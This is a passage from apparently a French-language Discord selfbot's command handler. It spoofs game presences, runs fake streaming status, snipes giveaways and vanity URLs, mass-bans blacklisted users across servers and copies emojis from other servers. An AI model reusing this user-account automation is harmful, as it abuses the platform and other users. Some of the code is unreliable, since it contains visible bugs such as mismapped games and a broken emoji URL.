        else if (cmd.slice(0, 2).join(' ') === (prefix + "clash royale")){
            client.user.setSamsungActivity(games['clash-royale'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Clash Royale*`)
        }

        else if (cmd.slice(0, 3).join(' ') === (prefix + "clash of clans")){
            client.user.setSamsungActivity(games['clash-of-clans'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Clash of Clans*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "lol")){
            client.user.setSamsungActivity(games['league'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Wild Rift*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "callof")){
            client.user.setSamsungActivity(games['warzone'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Call of Duty: Warzone*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "roblox")){
            client.user.setSamsungActivity(games['warzone'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Roblox*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "uno")){
            client.user.setSamsungActivity(games['uno'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Uno*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "geometry dash")){
            client.user.setSamsungActivity(games['geometry-dash'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Geometry dash*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "subway")){
            client.user.setSamsungActivity(games['subway'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Subway Surfers*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "candy crush")){
            client.user.setSamsungActivity(games['candy-crush'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Candy Crush*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "piano tiles")){
            client.user.setSamsungActivity(games['piano-tiles'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Piano Tiles*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "minecraft")){
            client.user.setSamsungActivity(games['minecraft'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Minecraft*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "fnaf")){
            client.user.setSamsungActivity(games['fnaf'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Five Nights at Freddy's*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "dokkan")){
            client.user.setSamsungActivity(games['dokkan'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Dokkan Battle*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "pokemongo")){
            client.user.setSamsungActivity(games['pokemongo'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Pokemon Go*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "genshin")){
            client.user.setSamsungActivity(games['genshin'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Genshin Impact*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "stumble")){
            client.user.setSamsungActivity(games['stumble-guys'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Stumble Guys*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "blue archive")){
            client.user.setSamsungActivity(games['blue-archive'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Blue Archive*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "honkai impact")){
            client.user.setSamsungActivity(games['honkai-impact'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Honkai Impact*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "honkai star")){
            client.user.setSamsungActivity(games['honkai-star-rail'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Honkai Star Rail*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "treasure cruise")){
            client.user.setSamsungActivity(games['treasure-cruise'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à One Piece: Treasure Cruise*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sds")){
            client.user.setSamsungActivity(games['sds'], "START")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Tu joues maintenant à Seven Deadly Sins*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "samsung stop")){
            client.user.setSamsungActivity(games['roblox'], "STOP")
            message.edit(`ガ __**${name} - Samsung Status**__ ガ\n> *Le status samsung a été supprimé*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "rpc save")){
            const id = args[1] || makeid(16)
            if (client.user.presence.activities.filter(a => a.type !== "CUSTOM").length === 0) return message.edit(`ガ __**${name} - RPC Save**__ ガ\n> *Vous n'avez aucun rpc de lancé*`)
            
            const activity = client.user.presence.activities.filter(a => a.type !== "CUSTOM")[0]
            const data = {}
            data.name = activity.name
            data.type = activity.type
            data.url = activity.url
            data.app = activity.applicationId
            data.state = activity.state
            data.details = activity.details
            data.party = activity.party
            data.timestamps = activity.timestamps ? true : false
            data.assets = activity.assets
            data.buttons = activity.buttons
            data.ipc = activity.ipc
            data.created = activity.createdAt
            data.secrets = activity.secrets
            data.metadata = activity.metadata

            client.save(`${__dirname}/Data/RPC/${id}.json`, data)
            message.edit(`ガ __**${name} - RPC Save**__ ガ\n> *Le RPC a été sauvegardé (faites \`${prefix}rpc load ${id}\` pour charger le RPC)*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "rpc load")){
            if (!args[1] || !fs.existsSync(`${__dirname}/Data/RPC/${args[1]}.json`)) return message.edit(`ガ __**${name} - RPC Load**__ ガ\n> *Vous n'avez aucun rpc avec cet ID*`)
            const activity = require(`${__dirname}/Data/RPC/${args[1]}.json`)

            if (activity.timestamps) activity.timestamps = { start: Date.now() }
            activity.id = "901cf3afbc811398"
            activity.plateform = "ps5"

            const rpc = new discord.RichPresence(client, activity)
            client.user.setPresence({activities: [rpc]})

            message.edit(`ガ __**${name} - RPC Load**__ ガ\n> *Votre RPC a été chargé*`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "rpc date")){
            if (args[1] === "stop"){
                if (client.interval["rpc date"]) clearInterval(client.interval["rpc date"])
                message.edit(`ガ __**${name} - RPC Date**__ ガ\n> *Votre RPC a été arrêté*`)

                if (client.interval["rpc actuel"]){
                    const rpc = new discord.RichPresence(client, client.interval["rpc actuel"])
                    client.user.setPresence({activities: [rpc]})
                    delete client.interval["rpc actuel"]
                }
                else client.user.setActivity(null)
            }
            else {
                if (client.interval["rpc date"]) clearInterval(client.interval["rpc date"])
                if (!client.interval["rpc actuel"] && client.user.presence.activities.filter(a => a.type !== "CUSTOM").length > 0) client.interval["rpc actuel"] = client.user.presence.activities.filter(a => a.type !== "CUSTOM")[0]
                message.edit(`ガ __**${name} - RPC Date**__ ガ\n> *Votre RPC affichera maintenant la date*`)

                client.interval["rpc date"] = setInterval(() => {
                    const rpc = new discord.RichPresence(client).setName(formatDateWithTime(Date.now()))
                    client.user.setPresence({activities: [rpc]})
                }, 1000 * 5);
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "multistream")){
            if (args[0] === "stop"){
                if (client.interval["multistream"]) clearInterval(client.interval["multistream"])
                message.edit(`ガ __**${name} - Multi Stream**__ ガ\n> *Le multi stream a été désactivé*`)
                client.user.setActivity(null)
            }
            else {
                if (client.interval["multistream"]) clearInterval(client.interval["multistream"])
                message.edit(`ガ __**${name} - Multi Stream**__ ガ\n> *Le multi stream a été activé*`)

                client.interval["multistream"] = setInterval(() => {
                    client.user.setActivity(multi_status[Math.floor(Math.random() * multi_status.length)], {
                        type: "STREAMING",
                        url: twitch
                    });
                }, 5000);
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setrpc")){
            const types = ["playing", "competing", "listening", "streaming", "watching"]
            const activity = client.user.presence.activities.filter(a => a.type !== "CUSTOM")[0] || { name: "𝑹$𝒁-𝑷𝒓𝒐𝒋𝒆𝒄𝒕-𝙥𝙧𝙚𝙢𝙞𝙪𝙢", type: 0}

            if (!args[0]) return message.edit(`ガ __**${name} - Set RPC**__ ガ\n>>> \`${prefix}setrpc name\` ${client.separator} ***Modifie le nom du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc type${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le type du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc state${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le state du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc details${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie les details du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc timestamp${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive la timestamp du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc party${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le nombre de personnes sur le RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc largeimg${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie la grande image du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc smallimg${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie la petite image du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc button1${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le nom du premier bouton du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc button2${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le nom du deuxième bouton du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc buttonurl1${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie l'url du premier bouton du RPC***
            ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc buttonurl2${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie l'url du deuxième bouton du RPC***`.replaceAll("            ", ""))

            if (args[0] === "name"){
                if (!args[1]) return message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Veuillez entrer un nom de RPC valide*`)

                activity.name = args.slice(1).join(' ')
                
                const rpc = new discord.RichPresence(client, activity)
                client.user.setPresence({activities: [rpc]})

                message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le nom du RPC a été modifié*`)
            }
            else if (args[0] === "type"){
                if (!types.includes(args[1])) return message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Veuillez entrer un type valide (\`${types.map(r => r)}\`)*`)

                activity.type = args[1].toLocaleUpperCase()
                
                const rpc = new discord.RichPresence(client, activity)
                client.user.setPresence({activities: [rpc]})

                message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le type du RPC a été modifié*`)
            }
            else if (args[0] === "state"){
                if (!args[1]){
                    delete activity.state
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le state du RPC a été supprimé*`)    
                }
                else {
                    activity.state = args.slice(1).join(' ')
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le state du RPC a été modifié*`)    
                }
            }
            else if (args[0] === "details"){
                if (!args[1]){
                    delete activity.details
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Les details du RPC a été supprimé*`)    
                }
                else {
                    activity.details = args.slice(1).join(' ')
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Les details du RPC a été modifié*`)    
                }
            }
            else if (args[0] === "timestamp"){
                activity.timestamps = activity.timestamps ? false : { start: Date.now() }

                const rpc = new discord.RichPresence(client, activity)
                client.user.setPresence({activities: [rpc]})

                message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le timestamp du RPC a été ${activity.timestamps ? "ajouté" : "supprimé"}*`)    
            }
            else if (args[0] === "party"){
                if (!args[1] || !parseInt(args[1]) || !parseInt(args[2])){
                    delete activity.party
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *La party du RPC a été supprimé*`)    
                }
                else {
                    activity.party = { size: [ parseInt(args[1]), parseInt(args[2]) ]}
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *La party du RPC a été modifié*`)    
                }
            }
            else if (args[0] === "largeimg"){
                if (message.attachments.size > 0){
                    const url = message.attachments.first().url
                        .replace('https://cdn.discordapp.com/', 'mp:')
                        .replace('http://cdn.discordapp.com/', 'mp:')
                        .replace('https://media.discordapp.net/', 'mp:')
                        .replace('http://media.discordapp.net/', 'mp:');
                    
                    const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', message.attachments.first().url);
                    activity.assets.large_image = url?.startsWith("mp:") ? `${url}` : `mp:${getExtendURL[0].external_asset_path}`
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit({files: [], content: `ガ __**${name} - Set RPC**__ ガ\n> *La grande image du RPC a été modifiée*`})    
                }
                else if (args[1]?.startsWith("http")) {
                    const url = args[1]
                        .replace('https://cdn.discordapp.com/', 'mp:')
                        .replace('http://cdn.discordapp.com/', 'mp:')
                        .replace('https://media.discordapp.net/', 'mp:')
                        .replace('http://media.discordapp.net/', 'mp:');

                    const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', args[1]);

                    activity.assets.large_image = url?.startsWith("mp:") ? `${url}` : `mp:${getExtendURL[0].external_asset_path}`
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *La grande image du RPC a été modifiée*`)    
                }
                else if (!args[1]){
                    delete activity.assets.large_image
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *La grande image du RPC a été supprimée*`)    
                }
            }
            else if (args[0] === "smallimg"){
                if (message.attachments.size > 0){
                    const url = message.attachments.first().url
                        .replace('https://cdn.discordapp.com/', 'mp:')
                        .replace('http://cdn.discordapp.com/', 'mp:')
                        .replace('https://media.discordapp.net/', 'mp:')
                        .replace('http://media.discordapp.net/', 'mp:');

                    const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', message.attachments.first().url);
                    
                    activity.assets.small_image = url?.startsWith("mp:") ? `${url}` : `mp:${getExtendURL[0].external_asset_path}`

                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
                    message.edit({files: [], content: `ガ __**${name} - Set RPC**__ ガ\n> *La petite image du RPC a été modifiée*`})    
                }
                else if (args[1]?.startsWith("http")) {
                    const url = args[1]
                    .replace('https://cdn.discordapp.com/', 'mp:')
                    .replace('http://cdn.discordapp.com/', 'mp:')
                    .replace('https://media.discordapp.net/', 'mp:')
                    .replace('http://media.discordapp.net/', 'mp:');

                    const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', args[1]);

                    activity.assets.small_image =  url?.startsWith("mp:") ? `${url}` : `mp:${getExtendURL[0].external_asset_path}`
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *La petite image du RPC a été modifiée*`)    
                }
                else if (!args[1]){
                    delete activity.assets.small_image
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *La petite image du RPC a été supprimée*`)    
                }
            }
            else if (args[0] === "button1"){
                if (!args[1]){
                    activity.buttons[0] = undefined
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le bouton a été supprimé*`)    
                }
                else {
                    activity.buttons[0] = args.slice(1).join(' ')
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le bouton du RPC a été modifié*`)    
                }
            }
            else if (args[0] === "button2"){
                if (!args[1]){
                    activity.buttons[1] = undefined
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le bouton a été supprimé*`)    
                }
                else {
                    activity.buttons[1] = args.slice(1).join(' ')
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *Le bouton du RPC a été modifié*`)    
                }
            }

            else if (args[0] === "buttonurl1"){
                if (!args[1]){
                    activity.metadata.button_urls[0] = undefined
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *L'url du bouton a été supprimé*`)    
                }
                else if (args[1]?.startsWith("http")) {
                    activity.metadata.button_urls[0] = args[1]
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *L'url du du RPC a été modifié*`)    
                }
            }

            else if (args[0] === "buttonurl2"){
                if (!args[1]){
                    activity.metadata.button_urls[1] = undefined
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *L'url du bouton a été supprimé*`)    
                }
                else if (args[1]?.startsWith("http")) {
                    activity.metadata.button_urls[1] = args[1]
                    
                    const rpc = new discord.RichPresence(client, activity)
                    client.user.setPresence({activities: [rpc]})
    
                    message.edit(`ガ __**${name} - Set RPC**__ ガ\n> *L'url du du RPC a été modifié*`)    
                }
            }

        }

































        else if (cmd.slice(0, 1).join(' ') === (prefix + "pubmp")){
            if (args[0] === "on"){
            
                if (tools.pub_mp === true) return message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Le système anti pub mp est déjà activé*`)
                tools.pub_mp = true
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Le système anti pub mp a été activé*`)
            }
            else if (args[0] === "off"){
            
                if (tools.pub_mp === false) return message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Le système anti pub mp est déjà désactivé*`)
                tools.pub_mp = false
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Le système anti pub mp a été désactivé*`)
            }
            else if (args[0] === "sanction"){
                if (args[1] === "bl"){
                    if (tools.protect_mp === true) return message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *La sanction est déjà activée*`)
                    tools.protect_mp = true
                    client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                    message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *La sanction en cas de pubmp sera un blacklist*`)    
                }
                else if (args[1] === "off"){
                    if (tools.protect_mp === false) return message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *La sanction est déjà désactivée*`)
                    tools.protect_mp = false
                    client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                    message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *La sanction en cas de pubmp a été désactivée*`)    
                }
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "afk")){
            if (args[0] === "on"){
                if (tools.afk === true) return message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Le système d'afk est déjà activé*`)
                tools.afk = true
                tools.afk_message = args.slice(1).join(' ') || "Aucune raison fournie"
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Vous êtes afk pour \`${args.slice(1).join(' ') || "Aucune raison fournie"}\`*`)
            }
            else if (args[0] === "off"){
                if (tools.afk === false) return message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Le système d'afk est déjà désactivé*`)
                tools.afk = false
                tools.afk_message = null
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Pub MP**__ ガ\n> *Le système d'afk a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gsniper")){
            if (args[0] === "on"){
                if (tools.giveaway_sniper === true) return message.edit(`ガ __**${name} - Giveaway Sniper**__ ガ\n> *Le giveaway sniper est déjà activé*`)
                tools.giveaway_sniper = true
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Giveaway Sniper**__ ガ\n> *Le giveaway sniper a été activé*`)
            }
            else if (args[0] === "off"){
                if (tools.giveaway_sniper === false) return message.edit(`ガ __**${name} - Giveaway Sniper**__ ガ\n> *Le giveaway sniper est déjà désactivé*`)
                tools.giveaway_sniper = false
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Giveaway Sniper**__ ガ\n> *Le giveaway sniper a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "bl") || cmd.slice(0, 1).join(' ') === (prefix + "blacklist")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!args[0]) return message.edit(`ガ __**${name} - Blacklist**__ ガ\n${tools.blacklist.map(id => `> <@${id}>`).join('\n')}`)
            else {
                const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
                if (!user) return message.edit(`ガ __**${name} - Blacklist**__ ガ\n> *Veuillez mentionner un utilisateur*`)

                if (tools.blacklist.includes(user?.id)) return message.edit(`ガ __**${name} - Blacklist**__ ガ\n> *${user.username} est déjà blacklist*`)
                tools.blacklist.push(user?.id)
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                
                let banned = 0

                for (const guild of client.guilds.cache.filter(g => g.members.me.permissions.has("BAN_MEMBERS")).map(r => r)){
                    try {
                        await guild.bans.create(user, {reason: "Blacklist"})
                        banned++
                    }
                    catch {}
                }

                message.edit(`ガ __**${name} - Blacklist**__ ガ\n> *${user.username} a été banni de ${banned}/${client.guilds.cache.size} serveurs*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unbl") || cmd.slice(0, 1).join(' ') === (prefix + "unblacklist")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!user) return message.edit(`ガ __**${name} - Blacklist**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            if (!tools.blacklist.includes(user?.id)) return message.edit(`ガ __**${name} - Blacklist**__ ガ\n> *${user.username} n'est pas blacklist*`)
            tools.blacklist = tools.blacklist.filter(id => id !== user?.id)
            client.save(`${__dirname}/Data/Tools/tools.json`, tools)
            
            message.edit(`ガ __**${name} - Blacklist**__ ガ\n> *${user.username} n'est plus blacklist*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "copy")){
            if (!tools.copy) tools.copy = []
            if (!args[0]) return message.edit(`ガ __**${name} - Copy**__ ガ\n${tools.copy?.map(id => `> <@${id}>`).join('\n') || "None"}`)
            else {
                const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
                if (!user) return message.edit(`ガ __**${name} - Copy**__ ガ\n> *Veuillez mentionner un utilisateur*`)

                if (tools.copy.includes(user?.id)) return message.edit(`ガ __**${name} - Copy**__ ガ\n> *Vous copiez déjà ${user.username}*`)
                tools.copy.push(user?.id)
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                

                message.edit(`ガ __**${name} - Copy**__ ガ\n> *Vous copiez maintenant ${user.username}`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "uncopy")){
            if (!tools.copy) tools.copy = []

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!user || !args[0]) return message.edit(`ガ __**${name} - Uncopy**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            if (!tools.copy?.includes(user?.id)) return message.edit(`ガ __**${name} - Uncopy**__ ガ\n> *Vous ne copiez pas ${user.username}*`)
            tools.copy = tools.copy.filter(id => id !== user.id)
            client.save(`${__dirname}/Data/Tools/tools.json`, tools)

            message.edit(`ガ __**${name} - Uncopy**__ ガ\n> *Vous ne copiez plus ${user.username}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "allemotes")){
            if (!message.guild) return message.edit(`ガ __**${name} - All Emotes**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - All Emotes**__ ガ\n> *Vous n'avez pas les permissions nécéssaires pour utiliser cette commande*`)

            const guild = client.guilds.cache.get(args[0]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - All Emotes**__ ガ\n> *Veuillez entrer l'ID d'un serveur*`)

            guild.emojis.cache.forEach(emoji => message.guild.emojis.create(emoji.url, emoji.name).catch(() => false))

            message.edit(`ガ __**${name} - All Emotes**__ ガ\n> *Vous allez copier ${guild.emojis.cache.size} emojis`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "allstickers")){
            if (!message.guild) return message.edit(`ガ __**${name} - All Stickers**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - All Stickers**__ ガ\n> *Vous n'avez pas les permissions nécéssaires pour utiliser cette commande*`)

            const guild = client.guilds.cache.get(args[0]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - All Stickers**__ ガ\n> *Veuillez entrer l'ID d'un serveur*`)

            guild.stickers.cache.forEach(emoji => message.guild.stickers.create(new discord.MessageAttachment(emoji.url), emoji.name, emoji.tags[0]).catch(() => false))
            message.edit(`ガ __**${name} - All Stickers**__ ガ\n> *Vous allez copier ${guild.stickers.cache.size} stickers`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "steal")){
            if (!message.guild) return message.edit(`ガ __**${name} - Steal Emotes**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - Steal Emotes**__ ガ\n> *Vous n'avez pas les permissions nécéssaires pour utiliser cette commande*`)

            if (!args[0]) return message.edit(`ガ __**${name} - Steal Emotes**__ ガ\n> *Veuillez entrer un emoji valide*`)
            const parsedEmoji = discord.Util.parseEmoji(args[0])
            if (!parsedEmoji.id) return message.edit(`ガ __**${name} - Steal Emotes**__ ガ\n> *L'emoji est invalide*`)


            message.guild.emojis.create(`https://cdn.discordapp.com/emojis/${parsedEmoji.id + parsedEmoji.animated ? ".gif" : ".png"}`, parsedEmoji.name)
                .then( () => message.edit(`ガ __**${name} - All Emotes**__ ガ\n> *Vous avez copier 1 emoji`))
                .catch(() => message.edit(`ガ __**${name} - All Emotes**__ ガ\n> *Vous n'avez pas pu copier 1 emoji`))
        }

        


        else if (cmd.slice(0, 1).join(' ') === (prefix + "vsniper")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (args[0] === "list"){
                message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *${Object.keys(tools.vanity_sniper).filter(id => client.guilds.cache.get(id)).map(id => `> ${client.guilds.cache.get(id).name} (${tools.vanity_sniper[id].url})`)} *`)
            }
            else if (args[0] === "remove"){
                const guild = client.guilds.cache.get(args[1]) || message.guild
                if (!guild) return message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *Veuillez entrer l'ID d'un serveur*`)

                if (!Object.values(tools.vanity_sniper).some(o => o.guildId === guild?.id)) return message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *Aucune vanity sniper n'est enregistré sous ce serveur*`)
                tools.vanity_sniper = Object.fromEntries(Object.entries(vanity).filter(([key, value]) => value.guildId !== guild?.id));
                
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *${guild.name} n'est plus dans la vanity sniper*`)
            }
            else {
                if (!message.guild) return message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
